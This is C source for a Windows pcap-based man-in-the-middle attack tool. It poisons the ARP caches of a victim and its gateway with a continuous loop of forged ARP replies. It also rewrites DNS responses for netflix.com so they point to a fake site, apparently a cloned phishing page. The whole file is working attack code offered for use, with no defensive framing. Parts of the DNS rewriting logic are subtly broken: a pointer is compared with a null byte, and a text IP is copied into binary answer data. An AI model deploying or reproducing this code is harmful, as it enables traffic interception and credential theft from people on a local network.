#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "spoof.h"

#define KEYWORD_SIZE 2

u_long fake_web = 1111; // TODO 

extern send_params infect_params;
static char* keywords[] = {"www.netflix.com", "netflix.com"};

DWORD WINAPI start_arp_spoofing(LPVOID lparam)
{
	int pack_size = sizeof(ether_hdr) + sizeof(arp_ether_ipv4);

	u_char victim_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
	u_char gateway_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];

	/* build the packets */
	build_packet(
		victim_packet,
		htonl(infect_params.gateway_ip),
		htonl(infect_params.victim_ip),
		infect_params.adapter->Address,
		infect_params.victim_mac,
		2 
	);

	build_packet(
		gateway_packet,
		htonl(infect_params.victim_ip),
		htonl(infect_params.gateway_ip),
		infect_params.adapter->Address,
		infect_params.gateway_mac,
		2
	);

	int condition = 1;
	while (condition)
	{
		pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
		pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
		Sleep(2000); 
	}
	return 0;
}

/*
* @purpose: Creates the actual fake DNS packet.
* @params: packet - the packet to be changed.
* @return: void.
* 
*/
static void create_fake_dns_respones(u_char* packet)
{
	/* locals */
	dns_hdr* dns_header;
	u_char* dns_data;
	struct in_addr fake_addr;

	dns_header = (dns_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr) + sizeof(udp_hdr));
	dns_data = (u_char*)(dns_header) + sizeof(dns_hdr);

	for (size_t i = 0; i < dns_header->questions; i++)
	{
		for (;dns_data != '\0'; dns_data++);
		dns_data += 5; // 2 type + 2 class + 1 next name.
	}
	
	fake_addr.S_un.S_addr = fake_web;
	for (size_t i = 0; i < dns_header->answers; i++)
	{
		dns_data += 12; // all dns answer byte length (Name(2), Type(2), Class(2), TTL(4), Data len(2))
		strcpy(dns_data, inet_ntoa(fake_addr));
	}
}

/*
* @purpose: Checks if a DNS packet is intended for the specific cloned website.
* If so changes the packet for DNS hijacking.
* @params: packet - the network packet
* @return: void
* 
*/
void dns_spoofing(u_char* packet)
{
	/* check if valid DNS packet */
	udp_hdr* udp_header = (udp_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr));
	if (udp_header->src_port != 53) // dns port
		return;

	/* check if DNS query name matches the spoofed names */
	char* query_name = (packet + sizeof(ether_hdr) + sizeof(ip_hdr) + sizeof(udp_hdr) + sizeof(dns_hdr) + 1);
	for (size_t i = 0; i < KEYWORD_SIZE; i++)
		if (strcmp(query_name, keywords[i]) == 0)
		{
			/* change packet content DNS respones */
			create_fake_dns_respones(packet);
			break;
		}
}
